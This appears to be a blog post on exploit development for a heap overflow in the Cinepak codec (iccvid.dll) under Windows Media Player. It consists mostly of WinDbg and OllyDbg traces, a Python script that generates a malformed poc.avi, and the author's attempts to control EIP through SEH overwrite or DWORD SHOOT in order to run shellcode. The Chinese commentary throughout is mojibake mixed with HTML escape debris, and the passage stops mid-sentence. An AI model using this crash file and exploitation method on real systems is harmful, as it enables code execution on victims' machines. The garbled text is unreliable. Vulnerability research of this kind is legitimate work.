        ProductVersion:   1.10.0.0
        FileVersion:      1.10.0.11
        FileDescription:  CinepakÂ® Codec
        LegalCopyright:   Copyright Â© 1992-1995 Radius Inc., All Rights Reserved
        LegalTrademarks:  CinepakÂ® is a trademark of Radius Inc.
    æŸ¥çœ‹iccvidæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯,è¿™é‡Œä¸èƒ½å†™æˆlmm iccvid.dll v,é‚£æ ·ä¸ä¼šæ‰¾åˆ°iccvidæ¨¡å—

bp 73b7cbee

bl
    0:007&amp;gt; bl
     0 e 73b7cbee     0001 (0001)  0:**** iccvid!Decompress+0x118
g
    0:007&amp;gt; g
    Breakpoint 0 hit
    eax=00000001 ebx=0ac5fd88 ecx=0005e2c0 edx=fffffee0 esi=0011db50 edi=0a9c0050
    eip=73b7cbee esp=0ac5fd38 ebp=0ac5fd60 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!Decompress+0x118:
    73b7cbee e8bb55ffff      call    iccvid!CVDecompress (73b721ae)

bp 73b722cc
    è¿™ä¸ªåœ°å€æ˜¯ä¸Šé¢é€šè¿‡è®¾ç½®hpaæ·»åŠ é¡µå †æ•æ‰åˆ°çš„å¼‚å¸¸å¤„çš„æŒ‡ä»¤
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 

g
    0:010&amp;gt; g
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=00147008 edi=00149008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    *** ERROR: Module load completed but symbols could not be loaded for C:\WINDOWS\system32\wmploc.dll
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:00149008=00000000 
    ds:0023:00147008=00930093

?edi;?esi
    0:010&amp;gt; ?edi;?esi
    Evaluate expression: 1347592 = 00149008
    Evaluate expression: 1339400 = 00147008
    ä¹Ÿå³edi=149008,esi=147008

!heap -p -a 149008
    0:010&amp;gt; !heap -p -a 149008
        address 00149008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    è¯´æ˜ediå±äºa0000å †çš„147000å †å—,è¿™ä¸ªå †å—æ˜¯å ç”¨æ€,è¿™ä¸ªå †å—ä»1470008åˆ°147008+6000=14D008ä¸ºè¿™ä¸ªå †å—çš„æ•°æ®åŒº

!heap -p -a 147008
    0:010&amp;gt; !heap -p -a 147008
        address 00147008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    è¯´æ˜esiå±äºa0000å †çš„147000å †å—,è¿™ä¸ªå †å—æ˜¯å ç”¨æ€,è€Œä¸”æ­£å¥½esi(147008)æ˜¯è¿™ä¸ªå †å—çš„ç´¢å¼•,è¯´æ˜73b722ccå¤„çš„rep
    movsæŒ‡ä»¤æ˜¯è¦å°†147000å †å—ä¸­çš„æ•°æ®å¾€è¿™ä¸ªå †å—è‡ªå·±çš„æ•°æ®åŒºå¼€å§‹åç§»149008-147008=2000å¤„å¼€å§‹å¤åˆ¶,å¯é€šè¿‡ecxæŸ¥çœ‹è¦
    å¤åˆ¶å¤šå°‘å­—èŠ‚æ•°æ®

?ecx
    0:010&amp;gt; ?ecx
    Evaluate expression: 2048 = 00000800
    800&amp;lt;6000-2000,åº”è¯¥ä¸ä¼šè¦†ç›–å †å—,ä½†æ˜¯+hpaæ—¶çš„ç¡®è¯´æ˜¯è¿™ä¸ªrep movsæŒ‡ä»¤å¯¼è‡´çš„å¼‚å¸¸,å…ˆç»§ç»­è¿è¡Œä¸‹å»

t
    0:010&amp;gt; t
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=000007ff edx=0aa5fd38 esi=0014700c edi=0014900c
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014900c=00000000 
    ds:0023:0014700c=00820082
    å‘ç°å†æ¬¡ä¸­æ–­,ä¹Ÿå³rep movsä¸æ˜¯ä¸€æ¬¡å°±ç»“æŸå¤åˆ¶äº†,æ­¤æ—¶edi=14900c,esi=14700c,å‰é¢çš„edi=149008,esi=147008,è¯´æ˜åˆš
    å¤åˆ¶å®Œ4å­—èŠ‚æ•°æ®,ä½†æ˜¯æ­¤æ—¶ecx=7ff,ä¸Šé¢ecx=800,è¯´æ˜ä¸€å…±è¦å¤åˆ¶4*800=2000&amp;lt;6000-2000,è¿™æ ·ç®—,è¿™ä¸ªå¤åˆ¶ç»“æŸåæ˜¯ä¸ä¼š
    è¦†ç›–å½“å‰å †å—çš„ä¸‹ä¸€å †å—çš„,åº”è¯¥ä¸ä¼šå¯¼è‡´å¼‚å¸¸,æš‚æ—¶ä¸å¯ç†è§£,ç»§ç»­å¾€ä¸‹èµ°

t 
    0:010&amp;gt; t
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=000007fe edx=0aa5fd38 esi=00147010 edi=00149010
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:00149010=00000000 
    ds:0023:00147010=00820082
    æƒ…å†µå’Œä¸Šé¢ä¸€æ ·,ç…§è¿™æ ·ä¸‹å»,ç›´åˆ°rep movså®Œæˆåº”è¯¥éƒ½ä¸ä¼šå¼‚å¸¸,ä½†æ˜¯windbgåœ¨è®¾ç½®é¡µå †æ—¶çš„ç¡®è¯´æ˜¯è¿™ä¸€æ¡æŒ‡ä»¤çš„é—®é¢˜,å°
    è¯•å–æ¶ˆ73b722ccå¤„å¯¹åº”çš„rep movsæŒ‡ä»¤,åœ¨è¿™ä¸€å¥ä¸Šé¢ä¸‹æ–­ç‚¹,çŒœæµ‹æœ‰å¯èƒ½æ˜¯ä¸€è½®rep movså®Œæˆåè¿˜æœ‰å…¶ä»–æœºä¼šå†æ‰§è¡Œåˆ°è¿™
    é‡Œ,ç„¶åæ‰å‘ç”Ÿè¦†ç›–å¯¼è‡´å¼‚å¸¸

bc *
ub eip
    0:010&amp;gt; ub eip
    iccvid!CVDecompress+0x102:
    73b722b0 807d1300        cmp     byte ptr [ebp+13h],0
    73b722b4 751b            jne     iccvid!CVDecompress+0x123 (73b722d1)
    73b722b6 803e11          cmp     byte ptr [esi],11h
    73b722b9 7516            jne     iccvid!CVDecompress+0x123 (73b722d1)
    73b722bb 8b4b1c          mov     ecx,dword ptr [ebx+1Ch]
    73b722be 8d3c01          lea     edi,[ecx+eax]
    73b722c1 b900080000      mov     ecx,800h
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]
    è¯´æ˜ä¸Šä¸€å¥æ±‡ç¼–æŒ‡ä»¤å¯¹åº”çš„åœ°å€æ˜¯73b722c6

bp 73b722c6
g
    0:010&amp;gt; g
    Breakpoint 0 hit
    eax=00004000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=01c1eb22 edi=0014b008
    eip=73b722c6 esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x118:
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]   
    æœç„¶ä¸­æ–­åˆ°rep movsçš„ä¸Šä¸€å¥
p
    0:010&amp;gt; p
    eax=00004000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=00149008 edi=0014b008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014b008=00000000 
    ds:0023:00149008=00930093
    æ­¤æ—¶ecx=800,edi=14b008,esi=149008,å†çœ‹ä¸‹æ­¤æ—¶çš„å¤åˆ¶æ•°æ®ä¸å †å—çš„å…³ç³»

!heap -p -a 14b008
    0:010&amp;gt; !heap -p -a 14b008
        address 0014b008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    ediä¸å‰é¢æ‰€åœ¨çš„å †å—ä¸€æ ·,ä»ç„¶æ˜¯åœ¨a0000å †çš„147008å †å—ä¸­,edi+800*4=14d008=147008+6000=14d008,è¯´æ˜è¿™ä¸€æ¬¡çš„rep
    movsæŒ‡ä»¤ä¼šåˆšå¥½æŠŠå½“å‰å †å—çš„æ•°æ®åŒºå¡«å……åˆ°æœ€å,è¿™æ ·åº”è¯¥ä¹Ÿä¸ä¼šç”±äºè¦†ç›–ä¸‹ä¸€ä¸ªå †å—å¯¼è‡´å¼‚å¸¸,å†æ¬¡æ¨æµ‹,å¯èƒ½è¿˜æœ‰ä¸‹ä¸€æ¬¡
    æœºä¼šä¼šå†æ‰§è¡Œåˆ°73b722ccå¤„çš„rep movsæŒ‡ä»¤

g
    0:010&amp;gt; g
    Breakpoint 0 hit
    eax=00006000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=01c1eb32 edi=0014d008
    eip=73b722c6 esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x118:
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]
    æœç„¶å†æ¬¡ä¸­æ–­äº†,è¯´æ˜çŒœæµ‹æ˜¯å¯¹çš„

p
    0:010&amp;gt; p
    eax=00006000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=0014b008 edi=0014d008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014d008=0c01008e 
    ds:0023:0014b008=00930093
    æ­¤æ—¶edi=14d008,esi=14b008,ecx=800

!heap -p -a 14d008
    0:010&amp;gt; !heap -p -a 14d008
        address 0014d008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0014d008 008e 0000  [01]   0014d010    00468 - (busy)
    è¿™é‡Œä¹Ÿå¯çœ‹å‡º,14d008æ˜¯ä¸Šé¢147000å †å—çš„ä¸‹ä¸€ä¸ªæ–°çš„å †å—çš„å…¥å£åœ°å€,è¿™ä¸ªæ–°å †å—çš„åœ°å€æ˜¯ä»14d008å¼€å§‹åˆ°
    14d010+468=14d478,è€Œè¿™æ¬¡è¦å¤åˆ¶çš„åœ°å€èŒƒå›´æ˜¯ä»edi=14d008åˆ°edi+800*4=14f008&amp;gt;14d478,è€Œä»14d478å¼€å§‹çš„åœ°å€ç©ºé—´å·²
    ç»å±äºä¸‹ä¸€ä¸ªå †å—,å¦‚ä¸‹

!heap -p -a 14d478
    0:010&amp;gt; !heap -p -a 14d478
        address 0014d478 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0014d478 008e 0000  [01]   0014d480    00468 - (busy)       
    è¯´æ˜14d478è¿™ä¸ªå †å—ä¼šè¢«è¦†ç›–,ä¸”14d480+468=14d8e8&amp;lt;14f008,ä¹Ÿå³è¦†ç›–å®Œè¿™ä¸ªå †å—è¿˜è¦ç»§ç»­è¦†ç›–åé¢çš„å †å—,è¿™æ ·ææœ‰å¯èƒ½ä¼šå¯¼
    è‡´å¼‚å¸¸çš„å‘ç”Ÿ,å¯ä»¥é¢„æµ‹,å†æ¬¡æ‰§è¡Œgå°†ä¼šå‘ç”Ÿå¼‚å¸¸
g
    0:010&amp;gt; g
    (1ac.1bc): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00006000 ebx=0a93d330 ecx=00000402 edx=0aa5fd38 esi=0014c000 edi=0014e000
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014e000=???????? 
    ds:0023:0014c000=00000000
    é¢„æµ‹æ­£ç¡®,æ­¤æ—¶ecx=402,è¯´æ˜æ˜¯å¤åˆ¶äº†(800-402)*4=3fe*4=ff8(10è¿›åˆ¶çš„4088ä¸ª)å­—èŠ‚åç¨‹åºå¼‚å¸¸,å¹¶å†ä¸å¯æ§,å•ç‹¬è¿è¡Œ
    wmplayer.exeå¹¶æ‰“å¼€poc.aviæ—¶ä¼šå¼¹å‡ºå¦‚ä¸‹æŠ¥é”™å¯¹è¯æ¡†
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-4.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;è¯´æ˜æ˜¯å¤åˆ¶äº†4008ä¸ªå­—èŠ‚å,ä¸‹é¢çš„å†…å­˜ä¸å¯å†™äº†,å¼•å‘å¼‚å¸¸,ç°åœ¨è¦æƒ³åŠæ³•æ§åˆ¶eip,æ‰§è¡Œæˆ‘çš„shellcode,è¦æƒ³æ§åˆ¶eip,ç°åœ¨è€ƒè™‘
ä»ä»¥ä¸‹å‡ ä¸ªè§’åº¦ä¸Šå…¥æ‰‹:
    1&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„retn
    2&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„seh
    3&amp;gt;æ‰¾åˆ°DWORD SHOOTæœºä¼š

1&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„retn
    è¿™ç§å¯èƒ½æ€§å‡ ä¹å¯ä»¥å¿½ç•¥,ä¸€èˆ¬å †æº¢å‡ºæ¼æ´çš„åˆ©ç”¨é‡‡ç”¨DWORD SHOOTçš„&quot;ç²¾ç¡®æ‰“å‡»&quot;,è¶…é•¿æ•°æ®è¦†ç›–ä½œä¸º&quot;åœ°æ¯¯å¼è½°ç‚¸&quot;è¿™ç§æ‰‹æ®µ
    ä¸€èˆ¬ç”¨äºæ ˆæº¢å‡º,å› ä¸ºretnåœ¨æ ˆä¸­,è€Œè¦æƒ³æŠŠæ•°æ®ä»å †åŒºè¦†ç›–åˆ°æ ˆåŒº,è¦å¤åˆ¶è¶…é•¿è¶…é•¿çš„æ•°æ®,æ­¤ä¾‹ä¸­,å½“eip=73B721EDæ—¶,å¯¹
    åº”å¦‚ä¸‹æŒ‡ä»¤,è¯¥eipåˆ°è¾¾æ–¹å¼ä¸ºåœ¨odä¸­å•ç‹¬æ‰“å¼€iccvid.dll,åœ¨73b7cbeeå¤„ä¸‹æ–­ç‚¹,è¯¥å¤„å¯¹åº”ä¸Šé¢çš„windbgçš„å…³é”®callä¸‹æ–­ç‚¹
    å¤„,ç„¶åodé™„åŠ é‡æ–°æ‰“å¼€çš„wmplayer.exe,å¹¶ç”¨wmplayer.exeæ‰“å¼€poc.avi,è§¦å‘73b7cbeeå¤„çš„æ–­ç‚¹,f7è·Ÿè¿›å…³é”®call,å•æ­¥åˆ°
    73b721edå¤„
        73B721ED  |.  8B75 0C       mov esi,[arg.2]
    æ­¤æ—¶odä¸­çš„æç¤ºå¤„æ˜¾ç¤ºå¦‚ä¸‹ä¿¡æ¯:
        å †æ ˆ ss:[0A80FD3C]=01C2CAF8
        esi=00000000
    åœ¨odæç¤ºçª—å£ä¸­çš„01c2caf8ä¸Šå³é”®åœ¨æ•°æ®çª—å£ä¸­è·Ÿéšæ•°å€¼,ç»“æœå¦‚ä¸‹:
        01C2CAF8  00 00 00 68 01 60 01 20 00 10 10 00 00 10 00 00  ...h` .....
        01C2CB08  00 00 00 60 01 60 20 00 00 00 11 00 00 10 41 41  ...`` .....AA
        01C2CB18  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 41  AAAAAAAAAA..AA
        01C2CB28  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 41  AAAAAAAAAA..AA
        01C2CB38  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 00  AAAAAAAAAA..A.
        01C2CB48  69 64 78 31 10 00 00 00 30 30 64 63 10 00 00 00  idx1...00dc...
    ä¹Ÿå³æ­¤æ—¶å¯¹åº”çš„æ•°æ®ä¸ºpoc.aviä¸­çš„cinepak_codec_data1å­—æ®µçš„æ•°æ®,å¦‚ä¸‹å›¾,å¯¹åº”exploit-dbé“¾æ¥ä¸º:
        https://www.exploit-db.com/exploits/15112/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-5.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    æ­¤æ—¶esp=0A80FD04,è€Œå¯æ§è¾“å…¥çš„æ•°æ®æ‰€åœ¨çš„å†…å­˜åœ°å€ä¸º01c2caf8,0a80fd04-01c2caf8=8BE320C=146682380ä¸ªå­—èŠ‚
    =139.887218475341796875 Må¤§å°,å¯è§æ•°æ®é‡ä¸å°,è¿™æ ·è‚¯å®šä¼šè¦†ç›–å¾ˆå¤šæ•°æ®,åœ¨æ‰§è¡Œåˆ°retnå‰å¿…ç„¶ä¼šå¼•å‘å¼‚å¸¸,æ‰€ä»¥æƒ³é€šè¿‡
    è¦†ç›–retnè¾¾åˆ°æ§åˆ¶eipæ˜¯ä¸å¯å–çš„

2&amp;gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„seh
    å¯¹åº”1ä¸­å¯è§‚å¯Ÿåˆ°å†…å­˜ä¸­çš„æ•°æ®ä¸ºcinepak_codec_data1å­—æ®µæ—¶,eip=73b721ed,alt+v,æŸ¥çœ‹seh,ç»“æœå¦‚ä¸‹:
        SEH é“¾ç”¨äº  çº¿ç¨‹  000006D4
        åœ°å€       SEå¤„ç†ç¨‹åº
        0A80FFDC   kernel32.7C839AC0
    è¦æƒ³è¦†ç›–åˆ°0a80ffdcå¤„,éœ€è¦è¦†ç›–0a80ffdc+4-01c2caf8=146683112ä¸ªå­—èŠ‚=139.88791656494140625 Må¤§å°,é‡æ–°ä¿®æ”¹ç”Ÿæˆ
    poc.aviçš„pythonä»£ç ,å°è¯•è¦†ç›–åˆ°sehå¤„ç†ç¨‹åºçš„åœ°å€,ä»1c2caf8åˆ°poc.aviçš„æœ€åä¸€ä¸ªæ„é€ çš„æ•°æ®æ‰€åœ¨çš„å­—ç¬¦å…±æœ‰105ä¸ªå­—
    èŠ‚,éœ€è¦åœ¨åé¢åŠ å¤š146683112-105=146683007ä¸ªå­—èŠ‚,å†åŠ 4ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–sehçš„å¼‚å¸¸å¤„ç†ç¨‹åºæŒ‡é’ˆ,ä¹Ÿå³146683011ä¸ªå­—èŠ‚
    ,æ„é€ ä»£ç å¦‚ä¸‹,åœ¨åŸæ¥çš„ä»£ç ä¸­åŠ å…¥
        my_data=&#39;B&#39;*146683011
        avifile.write(my_data)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import sys
 
def main():
 
    aviHeaders = &#39;\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
    padding = &#39;\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00&#39;
    movi_tag = &#39;\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00&#39;
    cinepak_codec_data1 = &#39;\x00\x00\x00\x68\x01\x60\x01\x20&#39;
    number_of_coded_strips = &#39;\x00\x10&#39;
    cinepak_codec_data2 = &#39;\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00&#39;
    idx_tag = &#39;\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00&#39;

    my_data=&#39;B&#39;*146683011
     
    avifile = open(&#39;poc.avi&#39;, &#39;wb+&#39;)
    avifile.write(aviHeaders)
    avifile.write(padding)
    avifile.write(movi_tag)
    avifile.write(cinepak_codec_data1)
    avifile.write(number_of_coded_strips)
    avifile.write(cinepak_codec_data2)
    avifile.write(idx_tag)

    avifile.write(my_data)
     
    avifile.close()
    print &#39;[-] AVI file generated&#39;
     
if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ubuntuä¸‹æ–°ç”Ÿæˆçš„pov.aviæ–‡ä»¶146.7M,æ‹·è´åˆ°winxpä¸­,ç”¨wmplayer.exeåœ¨odé™„åŠ ä¸‹æ‰“å¼€,åŒæ ·å•æ­¥åˆ°73b721edå¤„,åœ¨æç¤ºçª—
    å£ä¸­å³é”®åœ¨æ•°æ®çª—å£ä¸­è·Ÿéšæ•°å€¼,å¦‚ä¸‹å›¾
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/heap-6.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    ä»ä¸Šé¢å›¾ä¸­çœ‹å‡º,æ•°æ®çª—å£ä¸­å­—ç¬¦&quot;B&quot;å¹¶æ²¡æœ‰å¤åˆ¶146683011ä¸ªåˆ°å†…å­˜å°±è¢«æˆªæ–­äº†,è¯´æ˜æƒ³åˆ©ç”¨è¶…é•¿æ•°æ®ä»å †åŒºè¦†ç›–åˆ°æ ˆåŒºä¸­
    çš„sehçš„æƒ³æ³•ä¹Ÿä¸èƒ½å®ç°

3&amp;gt;æ‰¾åˆ°ä¸€æ¬¡DWORD SHOOSTæœºä¼š
    å¦‚æœèƒ½æ‰¾åˆ°ä¸€æ¬¡DWORD SHOOTæœºä¼š,é‚£å°±æœ‰è¾ƒå¤šé€‰æ‹©å¯ä»¥æ§åˆ¶eipäº†,ä½†æ˜¯ä¸Šé¢æåˆ°DWORD SHOOTçš„æœºä¼šåœ¨ç¬”è€…çœ‹æ¥åªæœ‰ç©ºé—²å †
    å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”æ–°å †å—çš„åˆ†é…ä¼šæœ‰DWORD SHOOTæœºä¼š,ç°åœ¨è¦æƒ³åŠæ³•æ‰¾åˆ°è¿™æ ·çš„æœºä¼š,ä¸Šé¢è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°å½“æ‰§è¡Œåˆ°å…³é”®
    çš„rep movsæŒ‡ä»¤ç¬¬ä¸‰æ¬¡æ—¶ä¼šå‘ç”Ÿå¼‚å¸¸,å¿…é¡»è¦åœ¨rep movsæŒ‡ä»¤å‘ç”Ÿå¼‚å¸¸å‰æ‰¾åˆ°ä¸€æ¬¡HeapAllocçš„è°ƒç”¨æ‰æœ‰å¯èƒ½å¯ä»¥DWORD
    SHOOT,è€Œä¸”HeapAllocè¦å‡ºç°åœ¨poc.aviä¸­çš„æ•°æ®å¤åˆ¶åˆ°å†…å­˜ä¸­ä¹‹å

    ä¹Ÿå³è¦åœ¨wmplayer.exeæ‰“å¼€poc.aviä¹‹ååˆ°rep movsç¬¬ä¸‰æ¬¡å¤åˆ¶å¼‚å¸¸å‘ç”Ÿä¹‹å‰è¿™æœŸé—´æ‰¾åˆ°HeapAllocçš„è°ƒç”¨
    
    é‡æ–°odé™„åŠ wmplayer.exe,åœ¨1c2caf8ä¸Šä¸‹å†…å­˜å†™å…¥æ–­ç‚¹(1c2caf8å¯¹åº”åŸæ¥çš„poc.aviä¸­çš„ç”Ÿæˆæ•°æ®ä¸­çš„
    cinepak_codec_data1å­—æ®µ),å¹¶ç”¨wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi
        è¿™ç§æƒ³æ³•æ²¡èƒ½å®ç°,å› ä¸ºodé™„åŠ wmplayer.exeå,1c2caf8å†…å­˜åœ°å€è¿˜æ²¡å‡ºç°,æ— æ³•ä¸‹å†…å­˜å†™å…¥æ–­ç‚¹,å°è¯•ç­‰1c2caf8å‡ºç°
        åå†ä¸‹å†…å­˜æ–­ç‚¹å¹¶é‡æ–°odåŠ è½½,ä½†æ˜¯è¿™æ ·æ— æ³•åœ¨1c2caf8è¢«å†™å…¥ä¹‹å‰æ–­ä¸‹

    ä¸Šé¢çš„æ–¹æ³•å¤±è´¥,äºæ˜¯é‡‡ç”¨ä¸‹é¢çš„æ–¹æ³•:
        è¿è¡Œwmplayer.exe
        odé™„åŠ wmplayer.exe
        wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi
        ä¸­æ–­åˆ°å…³é”®callå¤„å³é”®æŸ¥æ‰¾æ‰€æœ‰æ¨¡å—é—´çš„è°ƒç”¨
        åœ¨æ¯ä¸ªkernel32.LocalAllocä¸Šè®¾ç½®æ–­ç‚¹(è¿™é‡Œæ²¡æœ‰HeapAlloc,åªæœ‰LocalAlloc),ä¸€å…±æœ‰10ä¸ªLocalAllocè°ƒç”¨
            LocalAllocå’ŒHeapAllocçš„åŒºåˆ«:
            http://bbs.csdn.net/topics/350074008
            ç”±ä¸Šé¢é“¾æ¥å¯çŸ¥,LocalAllocæ˜¯åœ¨è¿›ç¨‹é»˜è®¤å †ä¸Šåˆ†é…ç©ºé—´,è€ŒHeapAllocä¸€èˆ¬æ˜¯ç”±HeapCreateæ–°ç”Ÿæˆçš„å †ä¸­åˆ†é…ç©ºé—´
            ,å½“HeapAllocçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯GetProcessHeap()çš„å€¼é™¤å¤–
        é‡æ–°è¿è¡Œwmplayer.exeå¹¶ç”¨odé™„åŠ ,å¹¶ç”¨wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi

    odä¸­æ–­åˆ°ä¸‹é¢çš„73b7b4a9å¤„çš„LocalAlloc
        73B7B4A2  |&amp;gt; \68 A0000000   push 0xA0                                             ; /Size = A0 (160.)
        73B7B4A7  |.  6A 40         push 0x40                                             ; |Flags = LPTR
        73B7B4A9  |.  FF15 4C10B773 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.LocalAlloc&amp;gt;]            ; \LocalAlloc

    æ­¤æ—¶åœ¨æ•°æ®çª—å£ä¸­ctrl+g:1c2caf8,å‘ç°1c2caf8å¤„å°šä¸”æ²¡æœ‰å†™å…¥poc.aviä¸­æ„é€ çš„æ•°æ®,è¯´æ˜è¿™ä¸ªLocalAllocä¸æ˜¯æ»¡è¶³
